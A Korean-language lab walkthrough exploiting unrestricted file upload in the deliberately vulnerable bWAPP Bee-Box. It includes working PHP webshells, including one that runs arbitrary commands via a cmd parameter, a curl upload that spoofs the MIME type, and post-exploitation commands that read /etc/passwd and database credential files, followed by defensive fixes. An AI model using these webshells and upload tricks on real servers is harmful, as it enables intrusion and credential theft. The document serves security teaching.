# 웹 해킹 실습 교육: Unrestricted File Upload (비제한 파일 업로드)

> **교육 목적 전용 (For Educational Purposes Only)**  
> 본 문서는 bWAPP(Bee-Box) 취약점 실습 환경을 대상으로 작성되었습니다.  
> 허가 없이 타인의 시스템에 적용하는 것은 불법입니다.

---

## 📋 실습 환경 정보

| 항목 | 내용 |
|------|------|
| **대상 서버** | `192.168.0.20` (bWAPP Bee-Box) |
| **공격자 서버** | `192.168.0.146` (Kali Linux) |
| **실습 URL** | `http://192.168.0.20/bWAPP/unrestricted_file_upload.php` |
| **계정 정보** | `bee / bug` |
| **보안 레벨** | Low (Security Level: 0) |
| **실습 일시** | 2026-04-20 |

---

## 🎯 취약점 개요

### Unrestricted File Upload란?

**비제한 파일 업로드(Unrestricted File Upload)** 취약점은 웹 애플리케이션이 업로드되는 파일의 **종류, 형식, 내용을 충분히 검증하지 않을 때** 발생합니다.

공격자는 이 취약점을 이용하여:
- **PHP 웹쉘(Webshell)** 업로드 → 원격 명령 실행
- **악성 스크립트** 업로드 → 서버 제어 탈취
- **시스템 정보 수집** → 추가 공격 발판 마련

### OWASP Top 10 분류
- **A08:2021** – Software and Data Integrity Failures
- 구 분류: A5 – Security Misconfiguration / Unrestricted File Upload

---

## 🔍 공격 흐름 다이어그램

```
[공격자 (Kali Linux)]
        │
        ▼
[1단계] 로그인 (bee/bug)
        │
        ▼
[2단계] 파일 업로드 페이지 탐색
        │
        ▼
[3단계] PHP 웹쉘 파일 생성 (shell.php)
        │
        ▼
[4단계] 웹쉘 업로드 (MIME Type 조작)
        │
        ▼
[5단계] 업로드된 웹쉘 URL 확인
        │
        ▼
[6단계] 웹쉘 실행 → 원격 코드 실행 (RCE)
        │
        ▼
[7단계] 시스템 정보 수집 (passwd, DB 설정 등)
```

---

## 🛠️ 단계별 실습 (실제 실행 명령어)

### Step 0: 환경 준비 및 세션 쿠키 디렉토리 설정

```bash
# 실습 디렉토리 이동
cd /home/kali/docker_exam

# 대상 서버 연결 확인
ping -c 3 192.168.0.20
```

**실행 결과:**
```
PING 192.168.0.20 (192.168.0.20) 56(84) bytes of data.
64 bytes from 192.168.0.20: icmp_seq=1 ttl=64 time=0.xxx ms
```

---

### Step 1: bWAPP 로그인 및 세션 쿠키 획득

```bash
curl -s -c /home/kali/docker_exam/bwapp_cookie.txt \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     -X POST "http://192.168.0.20/bWAPP/login.php" \
     -d "login=bee&password=bug&security_level=0&form=submit" \
     -L -v 2>&1 | grep -E "Cookie|302|200"
```

**실행 결과 (주요 부분):**
```
< HTTP/1.1 302 Found
< Set-Cookie: PHPSESSID=60f3106a8a0b6f70fad5baf29e8b7b3c; path=/
< Set-Cookie: security_level=0; expires=Tue, 20-Apr-2027 03:00:32 GMT; path=/
< Location: portal.php
```

**획득한 세션 정보:**
```
PHPSESSID: 60f3106a8a0b6f70fad5baf29e8b7b3c
security_level: 0
```

> 💡 **포인트**: `-c` 옵션으로 쿠키를 파일에 저장하고, `-b` 옵션으로 이후 요청에 재사용합니다.

---

### Step 2: 파일 업로드 페이지 분석

```bash
# 업로드 페이지 소스 확인
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     "http://192.168.0.20/bWAPP/unrestricted_file_upload.php" | grep -A5 "form"
```

**페이지 분석 결과:**
```html
<form action="/bWAPP/unrestricted_file_upload.php" method="POST" enctype="multipart/form-data">
    <p><label for="file">Please upload an image:</label><br />
    <input type="file" name="file"></p>
    <input type="hidden" name="MAX_FILE_SIZE" value="10">
    <input type="submit" name="form" value="Upload">
</form>
```

> ⚠️ **취약점 확인**: `MAX_FILE_SIZE=10`은 클라이언트 측 제한으로 쉽게 우회 가능하며, 서버 측 파일 형식 검증이 없음을 확인합니다.

---

### Step 3: PHP 웹쉘(Webshell) 파일 생성

```bash
# 단순 정보 출력형 웹쉘 생성
cat > /home/kali/docker_exam/shell.php << 'EOF'
<?php
echo "<pre>";
echo "=== System Info ===\n";
echo system("id");
echo "\n";
echo system("uname -a");
echo "\n";
echo system("cat /etc/passwd");
echo "\n";
echo system("whoami");
echo "\n";
echo "</pre>";
?>
EOF
```

```bash
# 인터랙티브 웹쉘 생성 (임의 명령 실행 가능)
cat > /home/kali/docker_exam/shell2.php << 'EOF'
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
} else {
    echo "<pre>Usage: ?cmd=COMMAND</pre>";
}
?>
EOF
```

**파일 구조 설명:**

| 파일 | 역할 |
|------|------|
| `shell.php` | 고정 명령어 실행 (id, uname, passwd) |
| `shell2.php` | GET 파라미터로 임의 명령어 실행 |

---

### Step 4: 웹쉘 파일 업로드

```bash
# shell.php 업로드 (MIME Type을 image/jpeg로 위장)
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     -c /home/kali/docker_exam/bwapp_cookie.txt \
     -X POST "http://192.168.0.20/bWAPP/unrestricted_file_upload.php" \
     -F "file=@/home/kali/docker_exam/shell.php;type=image/jpeg" \
     -F "form=upload" | grep -i "uploaded\|href"
```

**서버 응답:**
```html
The image has been uploaded <a href="images/shell.php" target="_blank">here</a>.
```

```bash
# shell2.php 업로드
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     -c /home/kali/docker_exam/bwapp_cookie.txt \
     -X POST "http://192.168.0.20/bWAPP/unrestricted_file_upload.php" \
     -F "file=@/home/kali/docker_exam/shell2.php;type=image/jpeg" \
     -F "form=upload" | grep -o 'images/[^"]*'
```

**서버 응답:**
```
images/shell2.php
```

> 🚨 **핵심 취약점**: 서버가 파일 확장자나 실제 파일 내용을 검증하지 않아 `.php` 파일이 업로드 허용되었습니다.  
> `-F "file=@shell.php;type=image/jpeg"` — MIME Type을 `image/jpeg`로 속여 PHP 파일 업로드

**업로드된 파일 위치:**
```
http://192.168.0.20/bWAPP/images/shell.php
http://192.168.0.20/bWAPP/images/shell2.php
```

---

### Step 5: 웹쉘 실행 및 원격 코드 실행 (RCE)

```bash
# shell.php 실행 - 고정 시스템 정보 수집
curl -s "http://192.168.0.20/bWAPP/images/shell.php"
```

**실행 결과:**
```
=== System Info ===
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux bee-box 2.6.24-16-generic #1 SMP Thu Apr 10 13:23:42 UTC 2008 i686 GNU/Linux
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
...
bee:x:1000:1000:bee,,,:/home/bee:/bin/bash
mysql:x:112:124:MySQL Server,,,:/var/lib/mysql:/bin/false
neo:x:1001:1001::/home/neo:/bin/sh
alice:x:1002:1002::/home/alice:/bin/sh
thor:x:1003:1003::/home/thor:/bin/sh
wolverine:x:1004:1004::/home/wolverine:/bin/sh
johnny:x:1005:1005::/home/johnny:/bin/sh
selene:x:1006:1006::/home/selene:/bin/sh
...
www-data
```

```bash
# shell2.php 실행 - 임의 명령어 실행
curl -s "http://192.168.0.20/bWAPP/images/shell2.php?cmd=id"
curl -s "http://192.168.0.20/bWAPP/images/shell2.php?cmd=hostname"
curl -s "http://192.168.0.20/bWAPP/images/shell2.php?cmd=uname%20-a"
```

---

### Step 6: 시스템 정보 수집 (Post-Exploitation)

#### 6-1. 기본 시스템 정보

```bash
# 현재 사용자 확인
curl -s "http://192.168.0.20/bWAPP/images/shell2.php?cmd=id"
```
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
# 호스트명 확인
curl -s "http://192.168.0.20/bWAPP/images/shell2.php?cmd=hostname"
```
```
bee-box
```

```bash
# 운영체제 및 커널 버전 확인
curl -s "http://192.168.0.20/bWAPP/images/shell2.php?cmd=uname%20-a"
```
```
Linux bee-box 2.6.24-16-generic #1 SMP Thu Apr 10 13:23:42 UTC 2008 i686 GNU/Linux
```

#### 6-2. 계정 정보 수집

```bash
# /etc/passwd 파일 열람
curl -s "http://192.168.0.20/bWAPP/images/shell.php"
```

**탈취된 /etc/passwd 주요 계정:**
```
root:x:0:0:root:/root:/bin/bash       ← root 계정
bee:x:1000:1000:bee,,,:/home/bee:/bin/bash
neo:x:1001:1001::/home/neo:/bin/sh
alice:x:1002:1002::/home/alice:/bin/sh
thor:x:1003:1003::/home/thor:/bin/sh
wolverine:x:1004:1004::/home/wolverine:/bin/sh
johnny:x:1005:1005::/home/johnny:/bin/sh
selene:x:1006:1006::/home/selene:/bin/sh
```

#### 6-3. 웹 소스코드 열람

```bash
# bWAPP 디렉토리 목록 확인
curl -s "http://192.168.0.20/bWAPP/images/shell2.php?cmd=ls%20/var/www/bWAPP/"
```

**확인된 서버 파일 구조 (주요 항목):**
```
/var/www/bWAPP/
├── admin/
│   └── settings.php      ← DB 설정 포함
├── images/
│   ├── shell.php         ← 업로드된 웹쉘
│   └── shell2.php        ← 업로드된 웹쉘
├── config.inc.php
├── connect.php
└── ...
```

#### 6-4. 데이터베이스 자격 증명 탈취 🔴

```bash
# DB 설정 파일 열람
curl -s "http://192.168.0.20/bWAPP/images/shell2.php?cmd=cat%20/var/www/bWAPP/config.inc"
```

**탈취된 DB 자격 증명 (config.inc):**
```php
// Connection settings
$server   = "localhost";
$username = "alice";
$password = "loveZombies";
$database = "bWAPP_BAK";
```

```bash
# 메인 DB 설정 파일 열람
curl -s "http://192.168.0.20/bWAPP/images/shell2.php?cmd=cat%20/var/www/bWAPP/admin/settings.php"
```

**탈취된 DB 자격 증명 (admin/settings.php):**
```php
// Database connection settings
$db_server   = "localhost";
$db_username = "root";         ← 🔴 root 계정
$db_password = "bug";          ← 🔴 패스워드 탈취
$db_name     = "bWAPP";
```

---

## 📊 탈취 정보 요약

| 수집 정보 | 내용 |
|-----------|------|
| **서버 호스트명** | `bee-box` |
| **OS/커널** | `Linux 2.6.24-16-generic (Ubuntu 8.04)` |
| **아키텍처** | `i686 (32-bit)` |
| **웹 서버** | `Apache/2.2.8 (Ubuntu) PHP/5.2.4` |
| **웹 프로세스** | `www-data (uid=33)` |
| **시스템 계정** | root, bee, neo, alice, thor, wolverine, johnny, selene 등 |
| **DB 계정 1** | `alice / loveZombies` (bWAPP_BAK DB) |
| **DB 계정 2** | `root / bug` (bWAPP DB) |
| **업로드 경로** | `/var/www/bWAPP/images/` |
| **웹쉘 URL** | `http://192.168.0.20/bWAPP/images/shell.php` |
| **웹쉘 URL** | `http://192.168.0.20/bWAPP/images/shell2.php` |

---

## 🛡️ 취약점 발생 원인 분석

```php
// [취약한 코드 예시 - bWAPP unrestricted_file_upload.php]
if(isset($_FILES['file'])) {
    $upload_dir  = "/var/www/bWAPP/images/";
    $upload_file = $upload_dir . basename($_FILES['file']['name']);
    
    // ❌ 파일 확장자 검증 없음
    // ❌ 파일 내용(Magic Bytes) 검증 없음
    // ❌ MIME Type 서버 측 검증 없음
    
    if(move_uploaded_file($_FILES['file']['tmp_name'], $upload_file)) {
        echo "The image has been uploaded <a href='images/" 
             . basename($_FILES['file']['name']) 
             . "'>here</a>.";
    }
}
```

---

## 🔐 대응 방안 (방어 관점)

### 1. 파일 확장자 화이트리스트 검증
```php
// ✅ 허용된 확장자만 수락
$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'webp'];
$file_ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));

if (!in_array($file_ext, $allowed_extensions)) {
    die("허용되지 않는 파일 형식입니다.");
}
```

### 2. Magic Bytes(파일 시그니처) 검증
```php
// ✅ 실제 파일 내용으로 이미지 여부 확인
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime  = finfo_file($finfo, $_FILES['file']['tmp_name']);

$allowed_mimes = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($mime, $allowed_mimes)) {
    die("유효하지 않은 이미지 파일입니다.");
}
```

### 3. 업로드 디렉토리 PHP 실행 차단
```apache
# .htaccess 또는 Apache 설정
<Directory "/var/www/html/uploads/">
    php_flag engine off
    Options -ExecCGI
    AddHandler cgi-script .php .pl .py .jsp
</Directory>
```

### 4. 파일명 랜덤화
```php
// ✅ 원본 파일명 대신 랜덤 UUID 사용
$new_filename = bin2hex(random_bytes(16)) . '.' . $file_ext;
move_uploaded_file($_FILES['file']['tmp_name'], $upload_dir . $new_filename);
```

### 5. 파일 크기 서버 측 제한
```php
// ✅ 클라이언트 측 MAX_FILE_SIZE는 우회 가능 → 서버 측에서 검증
$max_size = 2 * 1024 * 1024; // 2MB
if ($_FILES['file']['size'] > $max_size) {
    die("파일 크기가 너무 큽니다.");
}
```

---

## 📚 추가 학습 자료

- [OWASP - Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [OWASP Testing Guide - File Upload](https://owasp.org/www-project-web-security-testing-guide/)
- [bWAPP 공식 사이트](http://www.itsecgames.com/)
- [PayloadsAllTheThings - File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)

---

## ⚖️ 법적 고지

> 이 문서의 모든 기법은 **bWAPP(Bee-Box)** 의도적 취약 환경에서  
> **교육 목적**으로만 수행되었습니다.  
>
> 허가받지 않은 시스템에 동일한 기법을 적용하는 것은  
> **정보통신망법 위반(해킹)**으로 **형사 처벌** 대상이 됩니다.  
>
> **반드시 본인 소유 또는 허가받은 환경에서만 실습하세요.**

---

*작성일: 2026-04-20 | 실습 환경: Kali Linux + bWAPP Bee-Box | 교육 목적 전용*
